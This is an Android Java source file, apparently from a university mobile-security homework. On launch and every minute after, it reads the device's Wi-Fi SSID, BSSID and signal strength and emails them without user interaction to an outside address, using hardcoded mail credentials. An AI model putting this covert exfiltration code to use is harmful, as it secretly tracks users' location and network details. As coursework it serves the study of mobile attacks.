package edu.cmu.mobilesec_hw2;

import android.app.Activity;
import android.content.Context;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;

public class MainActivity extends Activity {

    public static int count = 0;
    final Handler handler = new Handler();
    final Runnable runnableCode = new Runnable() {
        public void run() {
//            Log.d("Handlers", "Called on main thread");

            getWifiName(getApplicationContext());
            handler.postDelayed(this, 60000);
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        handler.post(runnableCode);

    }

    public String getWifiName(Context context) {
        WifiManager manager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
//        System.out.println("wifi manager is " + manager);
        if (manager.isWifiEnabled()) {
            WifiInfo wifiInfo = manager.getConnectionInfo();
            if (wifiInfo != null) {
//                System.out.println("wifi info is " + wifiInfo);
                NetworkInfo.DetailedState state = WifiInfo.getDetailedStateOf(wifiInfo.getSupplicantState());
                if (state == NetworkInfo.DetailedState.CONNECTED || state == NetworkInfo.DetailedState.OBTAINING_IPADDR) {
                    System.out.println("wifi name is " + wifiInfo.getSSID());
                    System.out.println("wifi name is " + wifiInfo.getBSSID());
                    // get the strength of wifi
                    int numberOfLevels=5;
                    int level=WifiManager.calculateSignalLevel(wifiInfo.getRssi(), numberOfLevels);
                    System.out.println("wifi power Bars is " +level);


                    SendEmailTask emailTask = new SendEmailTask(
                        "sliu2200899@gmail.com",
                        "..my.email.password", "sliu2200899@gmail.com"
                    );
                    emailTask.setEmailRecipient("shul2@andrew.cmu.edu");
                    emailTask.setEmailSubject("Awesome HW2 stuff!!");

                    emailTask.setEmailBody("this email was sent from hacked android app, without user interaction: \n" +
                    "   the wifi SSID is " + wifiInfo.getSSID() + "\n" +
                    "   the wifi BSSID is " + wifiInfo.getBSSID() + "\n" +
                    "   the wifi power strength is " + level + "\n");


                    Thread emailThread = new Thread(emailTask);
                    emailThread.start();
                }
            }
        }
        return null;
    }
}


